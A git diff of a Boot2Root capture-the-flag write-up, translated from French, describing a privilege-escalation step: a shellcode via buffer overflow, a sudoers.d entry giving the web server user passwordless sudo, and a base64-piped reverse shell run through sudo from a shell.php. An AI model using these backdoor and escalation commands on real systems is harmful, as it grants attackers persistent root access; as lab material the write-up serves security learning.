@@ -1,24 +1,20 @@
 # Boot2Root - Backdoor
 
-On recommence à partir de l'étape `Step 8 - Piscine a débordement`
+Starting from `Step 8 - Piscine a débordement`
 
 ## Step 8 - sudoers
 
-On lance le shellcode trouvable dans `scripts/shellcode.py`
-Ce qui nous donne les droits suffisants de lancer ces deux commandes:
+We use the `exploit_me` binary buffer overflow to launch the shellcode
+found at `scripts/shellcode.py`. Which gives us enough rights to launch these two commands:
 ```
 echo "www-data ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/afile
 chmod 0440 /etc/sudoers.d/afile
 ```
 
-Maintenant, le user du webserver est un sudoer, ce qui crée une backdoor considérable.
-Il suffit alors de lancer un reverse shell avec sudo
+Now, `www-data`, the user of the webserver is a sudoer, which is a considerable backdoor.
+We now have to launch a reverse shell with `sudo` thanks to the `shell.php`:
 
 ```
 printf "<reverse shell en base64>" | base64 -d | sudo sh
 ```
-
-Et hop root !
-
-## Sources
-Exploit suExec: https://www.exploit-db.com/exploits/27397
+And we are root !
